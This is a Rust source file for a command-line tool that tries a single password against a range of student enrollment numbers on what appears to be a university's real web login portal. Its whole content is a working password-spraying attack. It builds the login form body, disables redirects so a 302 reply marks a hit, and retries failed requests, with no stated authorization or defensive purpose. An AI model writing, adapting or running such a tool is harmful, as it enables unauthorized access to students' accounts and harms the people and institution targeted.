use reqwest::blocking::{Client, Response};
use reqwest::header::CONTENT_TYPE;
use reqwest::redirect::Policy;
use std::time::Duration;

use termion::{color, style};

pub struct Config {
    pub enrollment_number_start: u32,
    pub enrollment_number_end: Option<u32>,
    pub password: String,
}

enum Password {
    Correct,
    Incorrect,
    Unknown,
}

pub fn run(config: Config) {
    if let Some(enrollment_number_end) = config.enrollment_number_end {
        for e_number in config.enrollment_number_start..enrollment_number_end + 1 {
            println!("Checking for {}", e_number);
            let result = check_password(e_number, config.password.clone());

            match result {
                Password::Correct => println!(
                    "{}{}Correct Password{}{}",
                    style::Bold,
                    color::Fg(color::Green),
                    color::Fg(color::Reset),
                    style::Reset
                ),
                Password::Incorrect => println!(
                    "{}Incorrect Password{}",
                    color::Fg(color::Red),
                    color::Fg(color::Reset)
                ),
                Password::Unknown => println!(
                    "{}Password Could not be verified{}",
                    color::Fg(color::Red),
                    color::Fg(color::Reset)
                ),
            }
        }
    } else {
        println!("Checking for {}", config.enrollment_number_start);
        let result = check_password(config.enrollment_number_start, config.password.clone());

        match result {
            Password::Correct => println!(
                "{}{}Correct Password{}{}",
                style::Bold,
                color::Fg(color::Green),
                color::Fg(color::Reset),
                style::Reset
            ),
            Password::Incorrect => println!(
                "{}Incorrect Password{}",
                color::Fg(color::Red),
                color::Fg(color::Reset)
            ),
            Password::Unknown => println!(
                "{}Password Could not be verified{}",
                color::Fg(color::Red),
                color::Fg(color::Reset)
            ),
        }
    }
}

fn check_password(enrollment_number: u32, password: String) -> Password {
    let res = make_request(enrollment_number, password);

    match res {
        Ok(res) => match res.status().as_u16() {
            302 => Password::Correct,
            200 => Password::Incorrect,
            other => {
                println!("Error: Received Status Code {}", other);
                Password::Unknown
            }
        },
        Err(_) => Password::Unknown,
    }
}

fn make_request(enrollment_number: u32, password: String) -> Result<Response, &'static str> {
    let client_builder = Client::builder()
        .redirect(Policy::none())
        .timeout(Duration::new(5, 0));
    let client = client_builder.build().expect("Failed Building Client");

    let body = format!("txtuType=Member+Type&UserType=S&txtCode=Enrollment+No&MemberCode={}&txtPin=Password%2FPin&Password={}&BTNSubmit=Submit", enrollment_number, password);

    let mut res;
    let mut try_count = 5;

    while try_count > 0 {
        res = client
            .post("https://webkioskintra.thapar.edu:8443/CommonFiles/UserAction.jsp")
            .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
            .body(body.clone())
            .send();

        match res {
            Ok(res) => return Ok(res),
            Err(_) => try_count -= 1,
        }
    }

    Err("Couldn't Verify password")
}
